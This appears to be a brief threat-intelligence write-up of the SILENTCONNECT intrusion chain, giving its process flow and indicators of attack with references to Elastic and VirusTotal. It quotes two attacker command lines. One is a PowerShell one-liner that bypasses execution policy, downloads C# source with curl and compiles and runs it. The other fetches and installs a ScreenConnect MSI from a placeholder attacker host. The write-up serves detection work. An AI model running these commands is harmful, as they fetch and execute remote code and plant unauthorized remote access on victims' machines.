# Attack Flow
**Stage 1:** CAPTCHA page > wscript.exe (vbs file) -> powershell.exe > curl.exe > csc.exe (Microsoft .Net) > cvtres.exe  
**Stage 2:** powershell > curl.exe > msiexec.exe > ScreenConnect 

# IoA
**Stage 1:**
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -command ""New-Item -ItemType Directory -Path 'C:\Windows\Temp' -Force | Out-Null; curl.exe -L '{URL}' -o 'C:\Windows\Temp\{filename}.txt';Start-Sleep -Seconds 8;$source = [System.IO.File]::ReadAllText('C:\Windows\Temp\{filename}.txt');Start-Sleep -Seconds 1;Add-Type -ReferencedAssemblies 'Microsoft.CSharp' -TypeDefinition $source -Language CSharp; [HelloWorld]::SayHello()""
```
**Stage 2:** SILENTCONNECT (silently install the RMM)
```
New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null; curl.exe -L 
 'hxxps://{IP/Domain}/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
  -o 'C:\Temp\ScreenConnect.ClientSetup.msi'; Start-Process msiexec.exe '/i 
  C:\Temp\ScreenConnect.ClientSetup.msi'"
```

# References
[1] https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect  
[2] https://www.virustotal.com/gui/file/281226ca0203537fa422b17102047dac314bc0c466ec71b2e6350d75f968f2a3/behavior
